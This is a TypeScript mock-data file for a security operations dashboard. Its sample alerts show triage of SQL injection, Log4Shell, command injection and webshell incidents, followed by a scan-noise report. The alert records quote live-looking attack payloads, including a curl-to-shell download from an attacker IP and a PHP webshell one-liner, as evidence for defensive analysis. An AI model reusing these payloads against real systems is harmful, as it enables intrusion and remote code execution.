import {
  AlertTriangle,
  Bug,
  MailWarning,
  Network,
  Radar,
  Shield,
  type LucideIcon,
} from 'lucide-react';

export type ScenarioKey = 'alerts' | 'assets' | 'intel' | 'vulnerabilities' | 'drills' | 'attackSurface';

export interface SocMetric {
  label: string;
  value: string;
  hint: string;
  tone: 'red' | 'orange' | 'blue' | 'green' | 'purple' | 'slate';
}

export interface ScenarioSummary {
  key: ScenarioKey;
  title: string;
  description: string;
  href: string;
  configureHref: string;
  icon: LucideIcon;
  status: string;
  impact: string;
}

export interface ConfigSection {
  title: string;
  description: string;
  items: string[];
}

export interface ScenarioConfig {
  title: string;
  goal: string;
  prompt: string;
  sections: ConfigSection[];
  agents: string[];
  workflow: string[];
  outputs: string[];
}

export interface BlueprintToolCall {
  name: string;
  target: string;
  status: 'success' | 'failed';
  result: string;
}

export interface BlueprintConversationMessage {
  role: string;
  sender: string;
  time: string;
  content: string;
  toolCalls?: BlueprintToolCall[];
}

export const sharedStory = {
  incidentId: 'INC-2026-0522-017',
  attackerIp: '45.91.83.24',
  cve: 'CVE-2026-18411',
  asset: 'DMZ-WAF-02',
  assetOwner: '电商业务安全组',
  region: '华东一区 / 杭州机房',
  phishingCampaign: '2026 Q2 财务主题钓鱼演练',
  intelTopic: '边界设备远程命令执行利用链活跃',
};

export const socMetrics: SocMetric[] = [
  { label: '今日事件簇', value: '18', hint: '由 326 条原始告警聚合而来', tone: 'red' },
  { label: '待排查资产', value: '42', hint: '其中 7 台处于互联网暴露面', tone: 'orange' },
  { label: '待验证漏洞', value: '9', hint: `${sharedStory.cve} 已关联 3 台资产`, tone: 'purple' },
  { label: '自动化处置率', value: '68%', hint: '较上周提升 14%', tone: 'green' },
];

export const scenarioSummaries: ScenarioSummary[] = [
  {
    key: 'alerts',
    title: '告警运营',
    description: '把告警降噪、研判、深度调查放在一条连续工作流里。',
    href: '/soc/alerts',
    configureHref: '/soc/alerts?mode=configure',
    icon: AlertTriangle,
    status: '高优先级',
    impact: `${sharedStory.incidentId} 需要值班员确认`,
  },
  {
    key: 'assets',
    title: '设备巡检',
    description: '消费已发布的设备 Skill，按策略执行巡检并联动告警与案件。',
    href: '/soc/inspections',
    configureHref: '/devices',
    icon: Network,
    status: '运行中',
    impact: `${sharedStory.region} 有 2 台同型号防火墙待绑定巡检`,
  },
  {
    key: 'vulnerabilities',
    title: '漏洞排查',
    description: '从情报和 CVE 出发，完成影响资产排查和授权验证。',
    href: '/soc/vulnerabilities',
    configureHref: '/soc/vulnerabilities?mode=configure',
    icon: Bug,
    status: '需复测',
    impact: `${sharedStory.cve} 影响 ${sharedStory.asset}`,
  },
  {
    key: 'drills',
    title: '钓鱼演练',
    description: '覆盖方案生成、审批、投递、指标回收和复盘报告。',
    href: '/soc/drills',
    configureHref: '/soc/drills?mode=configure',
    icon: MailWarning,
    status: '审批通过',
    impact: `${sharedStory.phishingCampaign} 明日 10:00 投递`,
  },
];

export const supportingScenarios: ScenarioSummary[] = [
  {
    key: 'intel',
    title: '态势情报',
    description: '接微步 MCP，每天把行业情报转成资产排查和群推送动作。',
    href: '/soc/intel',
    configureHref: '/soc/intel?mode=configure',
    icon: Radar,
    status: '每日推送',
    impact: sharedStory.intelTopic,
  },
  {
    key: 'attackSurface',
    title: '互联网攻击面',
    description: '让 Agent 每日巡航公网资产、暴露服务、证书和影子资产。',
    href: '/soc/attack-surface',
    configureHref: '/soc/attack-surface?mode=configure',
    icon: Network,
    status: '发现变化',
    impact: '新增 3 个公网入口等待归属确认',
  },
];

export const threatTimeline = [
  { time: '09:12', title: 'NDR 发现异常出站连接', detail: `${sharedStory.asset} 访问 ${sharedStory.attackerIp}，命中 C2 行为模型。` },
  { time: '09:18', title: 'WAF 出现同源探测', detail: '同一来源 IP 对 3 个业务域名进行路径穿越和指纹探测。' },
  { time: '09:24', title: '微步情报命中', detail: `${sharedStory.attackerIp} 近 24 小时被标记为漏洞利用基础设施。` },
  { time: '09:31', title: 'Rex 合并为事件簇', detail: '326 条原始告警被聚合为 18 个事件簇，其中 1 个建议深度调查。' },
];

export const incidentClusters = [
  {
    id: 'NDR-2026-0614-001',
    title: 'WordPress SQL 注入攻击成功',
    rawAlerts: 1,
    confidence: 96,
    priority: 'P1',
    reason: 'NDR HTTP 日志命中 updatexml SQL 注入 payload，响应体回显 root@localhost。',
    owner: '应用安全组',
    srcIp: '106.12.35.52',
    ndrRule: 'NDR_HTTP_SQLI_UPDATEXML',
    request: {
      method: 'POST',
      host: 'www.example.com',
      uri: '/admin/dict/',
      payload: 'action=aa&query_vars[tax_query][1][include_children]=1&query_vars[tax_query][1][terms][1]=1) or updatexml(0x7e,concat(1,user()),0x7e)#&query_vars[tax_query][1][field]=term_taxonomy_id',
      llmAnalysis: '请求参数中包含 updatexml(0x7e,concat(1,user()),0x7e) 典型 MySQL 报错注入语句，攻击者试图通过 XML 函数触发 XPath 错误并回显当前数据库用户。',
      evidence: ['updatexml 函数', 'concat(1,user())', '注释符 # 截断后续 SQL'],
    },
    response: {
      statusCode: 200,
      llmAnalysis: '响应体包含 SQL 查询语句、XPATH syntax error 以及 root@localhost，说明后端未屏蔽数据库错误，攻击者已获取数据库用户信息。',
      evidence: ['XPATH syntax error', 'root@localhost', 'HTTP 200'],
    },
    srcIntel: {
      verdict: '恶意',
      location: '中国 / 百度智能云',
      tags: ['暴力破解', '网络扫描', '动态 IP'],
      summary: '威胁情报显示该 IP 在 2023-03-16 到 2024-08-11 期间多次参与网络攻击，同 C 段存在 14 个恶意或可疑 IP。',
    },
    asset: {
      name: '124.222.108.178',
      business: 'WordPress 站点',
      exposure: '公网',
      owner: '应用安全组',
      criticality: '高',
      context: '测绘信息显示目标存在 MySQL、Nginx 等服务，MySQL Banner 为 5.6.50-log，漏洞情报匹配 CVE-2022-21661 影响范围。',
    },
    conclusion: {
      verdict: '攻击成功',
      summary: '该告警为 WordPress SQL 注入攻击，攻击者成功通过 updatexml 报错注入获取数据库用户信息。',
      recommendation: '封禁 106.12.35.52 及同 C 段可疑 IP，修复 CVE-2022-21661，将 WordPress 升级至 5.8.3 以上，并关闭生产环境 SQL 错误回显。',
    },
    actions: ['封禁源 IP', '升级 WordPress', '排查数据库访问日志', '生成漏洞修复工单'],
  },
  {
    id: 'NDR-2026-0614-002',
    title: '终端访问钓鱼登录口',
    rawAlerts: 1,
    confidence: 83,
    priority: 'P2',
    reason: 'NDR 发现财务终端访问命中钓鱼情报的外部登录页，页面特征疑似凭证收集。',
    owner: '终端安全组',
    srcIp: '10.12.8.45',
    ndrRule: 'NDR_HTTP_PHISHING_LOGIN_INTEL',
    request: {
      method: 'GET',
      host: 'invoice-check.example',
      uri: '/login',
      payload: 'GET hxxps://invoice-check.example/login',
      llmAnalysis: '该告警可用字段较少，NDR 主要记录到内网终端访问外部 HTTPS 登录页。URL 路径为 /login，页面标题和表单字段包含 invoice、account、password 等关键词，结合域名情报判断为供应商对账主题钓鱼登录口。',
      evidence: ['钓鱼域名情报命中', '/login 登录路径', '财务终端访问', '页面包含账号密码表单'],
    },
    response: {
      statusCode: 200,
      llmAnalysis: '响应返回 200，页面为登录表单，未观察到攻击 payload 或漏洞利用痕迹。该告警的关键风险不在服务端攻击，而在用户可能输入企业凭证，需要与 EDR、邮件网关和 OA 上下文联合确认。',
      evidence: ['HTTP 200', '登录表单', 'password 字段', '外部新注册域名'],
    },
    srcIntel: {
      verdict: '内部终端',
      location: '办公网 / 财务网段',
      tags: ['财务实习生终端', '邮件链接点击', '需要身份确认'],
      summary: '源地址 10.12.8.45 对应用户 li.yan，OA 显示为财务实习生，入职 12 天。EDR 记录浏览器由 outlook.exe 拉起，符合邮件钓鱼点击链路。',
    },
    asset: {
      name: 'invoice-check.example/login',
      business: '外部钓鱼登录页',
      exposure: '互联网',
      owner: '终端安全组',
      criticality: '中高',
      context: '域名命中钓鱼情报，页面伪装供应商对账登录入口，和深度调查 INV-2026-0522-001 的邮件网关、EDR、OA 证据可关联。',
    },
    conclusion: {
      verdict: '疑似凭证钓鱼',
      summary: '该告警为终端访问钓鱼登录口事件。单条 NDR 告警信息较少，但域名情报、登录页特征、财务终端身份和邮件点击链路共同指向凭证钓鱼风险。',
      recommendation: '转入深度调查 INV-2026-0522-001，临时冻结用户外部访问，重置密码，检索同主题邮件收件人并确认是否存在凭证提交行为。',
    },
    actions: ['转入深度调查', '临时冻结账号外部访问', '重置用户密码', '检索同主题邮件收件人'],
  },
  {
    id: 'NDR-2026-0614-003',
    title: 'Log4Shell JNDI 远程代码执行成功',
    rawAlerts: 1,
    confidence: 94,
    priority: 'P1',
    reason: 'NDR 识别 ${jndi:ldap://...} payload，目标应用随后向外部 LDAP 服务发起回连。',
    owner: '电商业务安全组',
    srcIp: '45.83.12.21',
    ndrRule: 'NDR_HTTP_LOG4SHELL_JNDI_RCE',
    request: {
      method: 'GET',
      host: 'shop-api.example.com',
      uri: '/api/search?q=phone',
      payload: 'User-Agent: ${jndi:ldap://45.83.12.21:1389/Exploit}',
      llmAnalysis: '请求头 User-Agent 中包含 ${jndi:ldap://45.83.12.21:1389/Exploit}，这是 Log4Shell 漏洞利用的典型触发方式。攻击者试图诱导 Log4j 解析 JNDI 表达式并向外部 LDAP 服务加载恶意类。',
      evidence: ['${jndi:ldap://...}', 'User-Agent 注入', '外部 LDAP 1389 端口'],
    },
    response: {
      statusCode: 200,
      llmAnalysis: 'HTTP 响应本身返回 200，但更关键的是 NDR 随后观测到目标资产 shop-api.example.com 向 45.83.12.21:1389 发起 LDAP 回连，并在 4 秒后访问 /Exploit.class。该行为说明 JNDI 表达式已被服务端解析，漏洞利用高度可能成功。',
      evidence: ['HTTP 200', 'LDAP 回连 45.83.12.21:1389', 'GET /Exploit.class', '应用异常日志出现 JndiLookup'],
    },
    srcIntel: {
      verdict: '恶意',
      location: '荷兰 / AS9009',
      tags: ['Log4Shell 利用', 'PoC 投递', '恶意 LDAP 服务'],
      summary: '该源 IP 近期多次投递 JNDI payload，并开放 1389、8080 等用于 Log4Shell 利用链的常见端口，历史上与漏洞利用基础设施相关。',
    },
    asset: {
      name: 'shop-api.example.com',
      business: '电商搜索 API',
      exposure: '公网',
      owner: '电商业务安全组',
      criticality: '高',
      context: '资产运行 Java Spring Boot 应用，历史 SBOM 显示存在 log4j-core 2.14.1 组件，版本处于 CVE-2021-44228 影响范围。',
    },
    conclusion: {
      verdict: '疑似成功利用',
      summary: '该告警为 Log4Shell JNDI 远程代码执行攻击，NDR 同时观测到入站 JNDI payload 和目标资产对攻击源 LDAP 服务的出站回连，说明服务端很可能解析并触发了漏洞利用链。',
      recommendation: '立即隔离 shop-api.example.com 出网访问，封禁 45.83.12.21，升级 log4j-core 至安全版本，排查 JVM 进程、临时目录、启动项和异常外联。',
    },
    actions: ['隔离资产出网', '封禁源 IP', '升级 Log4j 组件', '排查 JVM 和主机痕迹'],
  },
  {
    id: 'NDR-2026-0614-004',
    title: '管理接口命令注入探测',
    rawAlerts: 1,
    confidence: 91,
    priority: 'P1',
    reason: '请求参数出现 shell 元字符和 whoami 命令，响应体包含 www-data。',
    owner: '电商业务安全组',
    srcIp: '198.235.24.44',
    ndrRule: 'NDR_HTTP_CMD_INJECTION',
    request: {
      method: 'POST',
      host: 'admin.shop.example.com',
      uri: '/api/tools/ping',
      payload: 'host=127.0.0.1;whoami',
      llmAnalysis: 'host 参数应为地址输入，但 payload 使用分号拼接 whoami，试图让后端系统命令执行链路运行攻击者附加命令。',
      evidence: ['分号命令拼接', 'whoami', '工具类 ping 接口'],
    },
    response: {
      statusCode: 200,
      llmAnalysis: '响应体出现 www-data 字符串，与 Linux Web 进程用户高度一致，说明命令可能已被执行。',
      evidence: ['HTTP 200', 'www-data', 'ping 输出与命令输出混合'],
    },
    srcIntel: {
      verdict: '可疑',
      location: '加拿大 / Censys',
      tags: ['测绘引擎', '指纹探测', '漏洞验证'],
      summary: '该来源常见于互联网测绘流量，但本次请求携带可执行命令，超出普通测绘行为。',
    },
    asset: {
      name: 'admin.shop.example.com',
      business: '电商后台',
      exposure: '公网',
      owner: '电商业务安全组',
      criticality: '高',
      context: '后台工具接口提供网络诊断能力，具备命令执行风险面，且目标资产承载订单和运营管理能力。',
    },
    conclusion: {
      verdict: '疑似成功利用',
      summary: 'NDR 请求和响应证据均指向命令注入，需按高危事件处置。',
      recommendation: '立即限制公网访问，保全应用日志和主机进程快照，排查 WebShell、异常进程和新增计划任务。',
    },
    actions: ['隔离后台公网入口', '拉取主机 EDR 数据', '排查 WebShell', '转入深度调查'],
  },
  {
    id: 'NDR-2026-0614-005',
    title: 'WebShell 远控命令执行成功',
    rawAlerts: 1,
    confidence: 95,
    priority: 'P1',
    reason: 'NDR 识别 WebShell 参数化命令执行流量，响应体回显系统用户和主机信息。',
    owner: '内容平台安全组',
    srcIp: '185.220.101.47',
    ndrRule: 'NDR_HTTP_WEBSHELL_REMOTE_COMMAND',
    request: {
      method: 'POST',
      host: 'cms.example.com',
      uri: '/uploads/2026/06/cache.jsp',
      payload: 'cmd=id;uname -a;curl http://185.220.101.47:8080/stage.sh|sh',
      llmAnalysis: '请求命中上传目录下的可疑 JSP 文件，并通过 cmd 参数连续执行 id、uname -a 和远程脚本下载命令。该行为不属于正常业务请求，符合 WebShell 远控执行特征。',
      evidence: ['上传目录 JSP 文件', 'cmd 参数', 'id/uname 命令', 'curl|sh 下载执行'],
    },
    response: {
      statusCode: 200,
      llmAnalysis: '响应体返回 uid=1001(www-data)、Linux 内核版本和主机名 cms-prod-02，说明攻击者提交的系统命令已经被目标服务器执行。随后 NDR 还观测到目标主机访问 185.220.101.47:8080/stage.sh，存在二阶段载荷下载风险。',
      evidence: ['HTTP 200', 'uid=1001(www-data)', 'Linux cms-prod-02', 'stage.sh 外联下载'],
    },
    srcIntel: {
      verdict: '恶意',
      location: '德国 / Tor Exit',
      tags: ['WebShell 控制端', '匿名代理', '二阶段载荷'],
      summary: '该 IP 被多源情报标记为匿名代理和恶意载荷分发节点，近 7 天内与多起 WebShell 控制和反弹连接活动相关。',
    },
    asset: {
      name: 'cms.example.com',
      business: '内容管理平台',
      exposure: '公网',
      owner: '内容平台安全组',
      criticality: '高',
      context: '资产提供内容发布和附件上传能力，部署在 DMZ 应用区。历史巡检显示上传目录曾存在脚本执行权限配置不当风险。',
    },
    conclusion: {
      verdict: '攻击成功',
      summary: '该告警为 WebShell 远控命令执行事件。攻击者通过已落地的 JSP WebShell 执行系统命令，并触发二阶段脚本下载，说明目标主机已经被远程控制。',
      recommendation: '立即隔离 cms.example.com，保全 Web 根目录、进程、网络连接和系统审计日志，删除 WebShell 前先完成取证，并排查同目录下其他可疑脚本和横向移动痕迹。',
    },
    actions: ['隔离受害主机', '封禁控制端 IP', '保全 WebShell 样本', '排查二阶段载荷和横向移动'],
  },
  {
    id: 'NDR-2026-0614-006',
    title: '文件上传接口 WebShell 投递尝试',
    rawAlerts: 1,
    confidence: 86,
    priority: 'P2',
    reason: 'multipart 上传包含 php 代码片段，响应返回上传成功 JSON。',
    owner: '内容平台安全组',
    srcIp: '193.36.119.42',
    ndrRule: 'NDR_HTTP_WEBSHELL_UPLOAD',
    request: {
      method: 'POST',
      host: 'cms.example.com',
      uri: '/api/upload',
      payload: 'filename=shell.php&content=<?php system($_GET["cmd"]); ?>',
      llmAnalysis: '上传内容包含 PHP system 函数和 cmd 参数，符合轻量 WebShell 投递特征；文件名后缀为 php，风险较高。',
      evidence: ['shell.php', 'system($_GET["cmd"])', 'multipart/form-data'],
    },
    response: {
      statusCode: 200,
      llmAnalysis: '响应 JSON 中出现 upload success 和可访问 URL 字段，说明服务端可能接受了上传文件，需要立即验证文件是否落盘和可执行。',
      evidence: ['upload success', '/uploads/2026/06/shell.php', 'HTTP 200'],
    },
    srcIntel: {
      verdict: '恶意',
      location: '英国 / AS61317',
      tags: ['黑灰产扫描', 'WebShell 投递', '匿名代理'],
      summary: '该 IP 被多源情报标记为 WebShell 投递和弱口令扫描基础设施。',
    },
    asset: {
      name: 'cms.example.com',
      business: '内容管理平台',
      exposure: '公网',
      owner: '内容平台安全组',
      criticality: '中高',
      context: '资产提供内容上传能力，历史上存在插件上传路径暴露问题，需要确认上传目录执行权限。',
    },
    conclusion: {
      verdict: '疑似上传成功',
      summary: '请求为明确 WebShell 投递，响应显示上传成功，需立即确认文件落盘和访问情况。',
      recommendation: '封禁源 IP，删除可疑上传文件，关闭上传目录脚本执行权限，并检查是否存在后续命令执行访问。',
    },
    actions: ['加入 FW 阻断', '删除可疑文件', '关闭上传目录执行权限', '排查后续访问'],
  },
];

export const alertDenoiseDailySummary = {
  date: '2026-06-14',
  scope: '全部告警源 / 全部安全域',
  rawCount: 9836,
  normalizedCount: 9836,
  filterRemovedCount: 6944,
  dedupRemovedCount: 1869,
  triageCount: 1023,
  normalizeFailedCount: 0,
  workflow: {
    name: 'stream_alert_denoise',
    chain: ['receive_alert', 'normalize', 'filter_logs', 'dedup_and_write'],
    strictFields: ['sip', 'dip'],
    lshFields: ['req_http_url', 'req_body', 'rsp_body'],
    threshold: 0.7,
  },
  categories: [
    {
      key: 'scan',
      title: '扫描告警',
      removed: 3428,
      ratio: '34.9%',
      trend: '+6.2%',
      description: '外部扫描器、搜索引擎、测绘引擎、内部扫描任务',
      reasons: ['外部通用扫描器探测登录口', '搜索引擎/测绘引擎访问公开路径', '内部安全工具周期扫描'],
    },
    {
      key: 'duplicate',
      title: '重复告警',
      removed: 1869,
      ratio: '19.0%',
      trend: '-2.4%',
      description: '相同源目 IP 与相似 URI/body 的 LSH 聚合',
      reasons: ['相同源目 IP 反复命中', 'URI 参数归一化后高度相似', '跨批次 dedup key 已见'],
    },
    {
      key: 'condition',
      title: '条件过滤',
      removed: 1124,
      ratio: '11.4%',
      trend: '+1.1%',
      description: '非 HTTP、方向不在研判范围、字段缺失',
      reasons: ['非 HTTP 入站噪声', '字段不足无法进入研判', '横向扫描按低优先级归档'],
    },
    {
      key: 'rule',
      title: '规则压制',
      removed: 782,
      ratio: '8.0%',
      trend: '-0.8%',
      description: '低价值规则、噪声规则、长期误报规则',
      reasons: ['通用爬虫访问规则', '目录枚举低价值命中', '运维脚本长期误报'],
    },
    {
      key: 'allowlist',
      title: '黑白名单',
      removed: 738,
      ratio: '7.5%',
      trend: '+0.6%',
      description: '授权扫描器、搜索引擎白名单、黑灰产聚合',
      reasons: ['授权漏扫平台白名单', '搜索引擎爬虫白名单候选', '黑灰产 IP 聚合为情报事件'],
    },
  ],
  scanReport: {
    title: '扫描告警分析日报',
    conclusion: '今日扫描类告警共 3,428 条，占原始告警 34.9%。其中外部扫描占 72.4%，内部扫描占 27.6%。扫描主要集中在登录口、配置文件、管理后台和框架指纹路径。',
    metrics: [
      { label: '扫描告警总数', value: '3,428' },
      { label: '外部扫描', value: '2,482' },
      { label: '内部扫描', value: '946' },
      { label: '被扫描资产', value: '183' },
      { label: '被扫描路径', value: '1,276' },
      { label: '独立源 IP', value: '392' },
      { label: '200 响应', value: '312' },
      { label: '404 响应', value: '2,761' },
    ],
    sourceDistribution: [
      { type: '外部扫描器', alerts: 820, ips: 146, feature: '高频路径探测、UA 随机、命中登录口' },
      { type: '搜索引擎', alerts: 830, ips: 64, feature: 'Baiduspider / Googlebot，访问公开页面、sitemap 和静态资源' },
      { type: '测绘引擎', alerts: 356, ips: 42, feature: '指纹探测、端口探活、标题抓取' },
      { type: '黑灰产扫描', alerts: 270, ips: 81, feature: '弱口令、漏洞 PoC、敏感文件探测' },
      { type: '未知外部扫描', alerts: 206, ips: 93, feature: '短时低频探测，来源归属暂未识别' },
      { type: '内部扫描器', alerts: 946, ips: 21, feature: '企业授权扫描任务、基线巡检' },
    ],
    assets: [
      { asset: 'login.shop.example.com', domain: '电商登录', exposure: '公网', scans: 486, ok: 73, notFound: 368, other: 45, paths: '登录口: /login, /admin, /api/auth；通用探活: /favicon.ico' },
      { asset: 'api.pay.example.com', domain: '支付 API', exposure: '公网', scans: 392, ok: 28, notFound: 331, other: 33, paths: '配置文件: /config, /.env；框架指纹: /actuator, /swagger-ui；业务接口: /v1/user' },
      { asset: 'oa.example.com', domain: 'OA 门户', exposure: '公网', scans: 311, ok: 64, notFound: 211, other: 36, paths: '登录口: /portal, /vpn, /sso；文件上传口: /upload；敏感文件: /backup.zip' },
      { asset: '10.20.8.17', domain: '生产应用', exposure: '内网', scans: 286, ok: 41, notFound: 226, other: 19, paths: '通用探活: /health；框架指纹: /metrics；Debug: /debug；配置文件: /application.yml' },
    ],
    pathIntent: [
      { type: '登录口', paths: '/login, /admin, /wp-login.php', alerts: 864, risk: '常见爆破和后台探测入口' },
      { type: '配置文件', paths: '/.env, /config.json, /application.yml', alerts: 517, risk: '可能暴露凭据和服务配置' },
      { type: '框架指纹', paths: '/actuator, /swagger-ui, /server-status', alerts: 421, risk: '用于识别技术栈和管理端' },
      { type: '敏感文件', paths: '/backup.zip, /db.sql, /.git/config', alerts: 389, risk: '可能直接造成数据泄露' },
      { type: '通用探活', paths: '/, /favicon.ico, /robots.txt', alerts: 1237, risk: '多为搜索引擎和测绘探活' },
    ],
    statusCodes: [
      { code: '404', count: 2761, ratio: '80.5%', explanation: '大部分扫描路径不存在，可作为低价值噪声' },
      { code: '200', count: 312, ratio: '9.1%', explanation: '路径存在或返回有效内容，需要关注' },
      { code: '301/302', count: 201, ratio: '5.9%', explanation: '多为登录跳转或站点重定向' },
      { code: '401/403', count: 116, ratio: '3.4%', explanation: '有认证或访问控制，仍需关注暴露面' },
      { code: '5xx', count: 38, ratio: '1.1%', explanation: '可能触发异常，需关联应用日志' },
    ],
    successfulAssets: [
      { asset: 'login.shop.example.com', business: '电商登录', exposure: '公网', okCount: 73, sensitive: '登录口 / SSO 回调', examples: '/login, /sso/callback, /api/auth/login', risk: '高', recommendation: '限制后台路径访问，关联 WAF 登录爆破规则' },
      { asset: 'oa.example.com', business: 'OA 门户', exposure: '公网', okCount: 64, sensitive: '登录口 / 文件上传口', examples: '/portal/login, /upload, /api/file/preview', risk: '高', recommendation: '确认上传鉴权和文件类型校验' },
      { asset: 'admin.crm.example.com', business: 'CRM 管理后台', exposure: '公网', okCount: 46, sensitive: '管理后台', examples: '/admin, /admin/user, /admin/export', risk: '高', recommendation: '建议仅 VPN 或办公出口访问' },
      { asset: 'api.pay.example.com', business: '支付 API', exposure: '公网', okCount: 28, sensitive: '接口文档 / 健康检查', examples: '/swagger-ui, /actuator/health, /v1/status', risk: '中', recommendation: 'Swagger 和 actuator 不应公网开放' },
      { asset: '10.20.8.17', business: '生产应用', exposure: '内网', okCount: 41, sensitive: '监控指标 / Debug', examples: '/metrics, /debug, /health', risk: '中', recommendation: '确认仅授权扫描器可访问' },
      { asset: 'files.example.com', business: '文件服务', exposure: '公网', okCount: 23, sensitive: '文件上传口 / 下载口', examples: '/upload, /download, /preview', risk: '高', recommendation: '检查匿名上传和临时链接策略' },
      { asset: 'vpn.example.com', business: 'VPN 网关', exposure: '公网', okCount: 18, sensitive: '登录口', examples: '/login, /remote/login, /ssl-vpn', risk: '高', recommendation: '联动弱口令和异常登录检测' },
      { asset: 'jenkins.build.local', business: '构建平台', exposure: '内网', okCount: 13, sensitive: '管理后台 / 插件接口', examples: '/login, /manage, /scriptText', risk: '高', recommendation: '未授权内部扫描源需转研判' },
      { asset: 'monitor.ops.example.com', business: '监控平台', exposure: '公网', okCount: 11, sensitive: '监控面板 / 指标接口', examples: '/grafana/login, /prometheus, /api/datasources', risk: '高', recommendation: '确认是否误暴露公网，限制访问来源' },
      { asset: 'wiki.example.com', business: '知识库', exposure: '公网', okCount: 9, sensitive: '登录口 / 附件预览', examples: '/login, /attachments, /pages/viewpage.action', risk: '中', recommendation: '检查匿名访问和附件下载权限' },
    ],
    externalSources: [
      { source: '45.83.12.21', type: '黑灰产', region: '荷兰 / AS9009', alerts: 126, assets: 18, okCount: 37, ua: 'python-requests/2.31', action: '保留情报关联，必要时封禁' },
      { source: '66.249.66.1', type: 'Googlebot', region: '美国 / Google', alerts: 118, assets: 31, okCount: 22, ua: 'Googlebot/2.1', action: '搜索引擎白名单候选' },
      { source: '220.181.108.15', type: 'Baiduspider', region: '中国 / 百度', alerts: 106, assets: 27, okCount: 19, ua: 'Baiduspider/2.0', action: '搜索引擎白名单候选' },
      { source: '198.235.24.44', type: '测绘引擎', region: '加拿大 / Censys', alerts: 83, assets: 22, okCount: 11, ua: 'CensysInspect/1.1', action: '低价值噪声，保留趋势' },
      { source: '167.94.138.51', type: '测绘引擎', region: '美国 / Censys', alerts: 79, assets: 20, okCount: 9, ua: 'CensysInspect/1.1', action: '低价值噪声，保留趋势' },
      { source: '162.142.125.12', type: '测绘引擎', region: '美国 / Shadowserver', alerts: 72, assets: 17, okCount: 8, ua: 'Mozilla/5.0 zgrab/0.x', action: '保留趋势，不进入研判' },
      { source: '87.236.176.33', type: '外部扫描器', region: '德国 / Internet Census', alerts: 68, assets: 15, okCount: 5, ua: 'InternetMeasurement/1.0', action: '低优先级归档' },
      { source: '185.220.101.47', type: '匿名代理', region: '德国 / Tor Exit', alerts: 63, assets: 9, okCount: 14, ua: 'curl/8.1.2', action: '转入情报聚合事件' },
      { source: '193.36.119.42', type: '黑灰产', region: '英国 / AS61317', alerts: 57, assets: 7, okCount: 18, ua: 'Go-http-client/1.1', action: '关注 200 响应路径' },
      { source: '104.152.52.29', type: '外部扫描器', region: '美国 / VPS', alerts: 49, assets: 6, okCount: 7, ua: 'masscan/1.3', action: '端口扫描噪声，保留样本' },
    ],
    internalSources: [
      { ip: '10.10.5.23', owner: '漏扫平台', alerts: 412, assets: 96, okCount: 58, task: '周期漏洞扫描', authorized: '是', action: '加入白名单并保留审计' },
      { ip: '10.10.5.24', owner: '基线巡检', alerts: 233, assets: 51, okCount: 31, task: '配置基线检查', authorized: '是', action: '降低研判优先级' },
      { ip: '10.12.8.66', owner: '未登记主机', alerts: 187, assets: 33, okCount: 44, task: '横向端口探测', authorized: '否', action: '转入研判或调查' },
      { ip: '10.20.1.18', owner: '运维脚本', alerts: 114, assets: 12, okCount: 16, task: '健康检查', authorized: '待确认', action: '补充资产标签' },
      { ip: '10.30.16.8', owner: '红队演练平台', alerts: 98, assets: 24, okCount: 21, task: '授权攻防演练', authorized: '是', action: '按演练窗口归档' },
      { ip: '10.60.2.19', owner: '未知办公终端', alerts: 76, assets: 18, okCount: 19, task: '目录枚举', authorized: '否', action: '转入终端排查' },
      { ip: '172.16.4.31', owner: '容器安全扫描', alerts: 64, assets: 15, okCount: 12, task: '镜像和服务探测', authorized: '是', action: '关联容器资产标签' },
      { ip: '10.70.9.102', owner: '资产测绘任务', alerts: 53, assets: 39, okCount: 8, task: '内网资产发现', authorized: '是', action: '加入授权扫描器列表' },
      { ip: '192.168.12.45', owner: '测试环境主机', alerts: 47, assets: 11, okCount: 13, task: '脚本探活', authorized: '待确认', action: '确认 owner 和任务窗口' },
      { ip: '10.80.3.77', owner: '未知服务器', alerts: 39, assets: 8, okCount: 10, task: '管理端探测', authorized: '否', action: '转入内部威胁研判' },
    ],
    sourceIpInventory: [
      { ip: '45.83.12.21', side: '外部', type: '黑灰产', region: '荷兰', asn: 'AS9009', intel: '恶意扫描 / PoC 投递', alerts: 126, assets: 18, okCount: 37, sensitiveHits: 12, firstSeen: '08:41', lastSeen: '16:58', topPath: '/admin, /.env, /upload', risk: '高', disposition: '建议加入 FW 阻断' },
      { ip: '185.220.101.47', side: '外部', type: '匿名代理', region: '德国', asn: 'Tor Exit', intel: '匿名出口 / 弱口令探测', alerts: 63, assets: 9, okCount: 14, sensitiveHits: 7, firstSeen: '09:33', lastSeen: '17:12', topPath: '/login, /vpn, /wp-login.php', risk: '高', disposition: '建议加入 FW 阻断' },
      { ip: '193.36.119.42', side: '外部', type: '黑灰产', region: '英国', asn: 'AS61317', intel: '漏洞扫描基础设施', alerts: 57, assets: 7, okCount: 18, sensitiveHits: 6, firstSeen: '10:19', lastSeen: '18:04', topPath: '/actuator, /swagger-ui', risk: '高', disposition: '关注 200 响应路径' },
      { ip: '66.249.66.1', side: '外部', type: '搜索引擎', region: '美国', asn: 'Google', intel: '合法爬虫', alerts: 118, assets: 31, okCount: 22, sensitiveHits: 0, firstSeen: '00:21', lastSeen: '23:40', topPath: '/, /robots.txt, /sitemap.xml', risk: '低', disposition: '白名单候选' },
      { ip: '220.181.108.15', side: '外部', type: '搜索引擎', region: '中国', asn: '百度', intel: '合法爬虫', alerts: 106, assets: 27, okCount: 19, sensitiveHits: 0, firstSeen: '01:08', lastSeen: '22:17', topPath: '/, /favicon.ico, /news', risk: '低', disposition: '白名单候选' },
      { ip: '198.235.24.44', side: '外部', type: '测绘引擎', region: '加拿大', asn: 'Censys', intel: '互联网测绘', alerts: 83, assets: 22, okCount: 11, sensitiveHits: 2, firstSeen: '03:46', lastSeen: '21:31', topPath: '/server-status, /actuator', risk: '中', disposition: '保留趋势' },
      { ip: '167.94.138.51', side: '外部', type: '测绘引擎', region: '美国', asn: 'Censys', intel: '互联网测绘', alerts: 79, assets: 20, okCount: 9, sensitiveHits: 1, firstSeen: '05:02', lastSeen: '20:45', topPath: '/, /title, /favicon.ico', risk: '中', disposition: '保留趋势' },
      { ip: '10.12.8.66', side: '内部', type: '未授权主机', region: '办公网', asn: 'N/A', intel: '横向扫描', alerts: 187, assets: 33, okCount: 44, sensitiveHits: 15, firstSeen: '11:09', lastSeen: '17:39', topPath: '/admin, /manage, /metrics', risk: '高', disposition: '转入研判并临时阻断' },
